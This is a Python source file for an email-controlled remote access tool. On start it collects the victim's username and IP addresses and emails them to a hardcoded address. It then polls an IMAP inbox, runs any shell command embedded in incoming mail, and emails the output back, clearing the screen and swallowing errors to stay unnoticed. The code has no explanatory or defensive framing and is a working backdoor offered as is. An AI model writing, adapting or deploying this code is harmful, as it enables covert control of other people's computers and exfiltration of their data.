import imaplib
import os
from time import sleep
import smtplib
from email.parser import Parser
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def send_email(email_recipient, email_subject, email_message):

	email_sender = 'name@mail.com'

	msg = MIMEMultipart()
	msg['From'] = email_sender
	msg['To'] = email_recipient
	msg['Subject'] = email_subject

	msg.attach(MIMEText(email_message, 'plain'))

	try:
		server = smtplib.SMTP('mail.server.com', 587)
		server.ehlo()
		server.starttls()
		server.login('name@mail.com', 'password')
		text = msg.as_string()
		server.sendmail(email_sender, email_recipient, text)
		server.quit()
	except:
		return True

def delete_emails():
	# Delete Inbox
	conn.select('INBOX')
	statusFROM, dataFROM = conn.search(None, 'FROM "username"')
	for num in dataFROM[0].split():
		conn.store(num, '+FLAGS', '\\Deleted')
	conn.expunge()
	# Delete Sent Items
	conn.select('"Sent Items"')
	statusTO, dataTO = conn.search(None, 'TO "username"')
	for num in dataTO[0].split():
		conn.store(num, '+FLAGS', '\\Deleted')
	conn.expunge()
	conn.select('INBOX')

def main():

	url = "mail.server.com" # Mail Server Address
	global conn
	conn = imaplib.IMAP4_SSL(url,993)
	user,password = ("username","password")
	conn.login(user,password)
	cmd_old = ""
	while True:
		try:
			conn.select('INBOX')
			results,data = conn.search(None,'ALL')
			msg_ids = data[0]
			msg_id_list = msg_ids.split()
			# Checks the last item in the inbox for command
			latest_email_id = msg_id_list[-1]
			result,data = conn.fetch(latest_email_id,"(RFC822)")
			raw_email = data[0][1].decode('utf-8')
			p = Parser()
			msg_contant = str(p.parsestr(raw_email))
			if "CMD" in msg_contant:
				name = os.popen('echo %username%').read()[:-1]
				i1,i2 = [i for i, x in enumerate(msg_contant) if x == "`"]
				cmd = msg_contant[i1+1:i2]
				if "EXIT" in cmd:
					# delete_emails()
					os._exit(0)
				else:
					cmd_old = cmd
					res = os.popen(cmd).read()
					os.system('cls')
					message = "\n\n"  + name +" => " + res
					sbj = name + " => " + cmd
					send_email('name@mail.com', sbj , message)

					# delete_emails()
			else:
				pass
		except:
			pass

if __name__ == '__main__':

	ips = os.popen('ipconfig | findstr IPv4').read()
	os.system('cls')
	user = os.popen('echo %username%').read()[:-1]
	os.system('cls')
	msg = user + " connected!\n\nIP:\n\n" + ips
	# Send Username and IP Address of Connected User
	send_email('name@mail.com', user, msg)

	while True:
		try:
			main()
		except:
			main()